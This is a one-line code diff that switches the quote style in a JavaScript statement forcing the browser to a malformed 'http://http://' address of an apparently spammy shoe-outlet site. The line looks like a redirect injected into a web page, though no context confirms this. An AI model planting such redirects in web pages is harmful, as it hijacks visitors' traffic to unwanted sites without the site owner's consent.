@@ -1,1 +1,1 @@
-window.location.href='http://http://www.usbestshoeoutlet.com/';
+window.location.href="http://http://www.usbestshoeoutlet.com/";
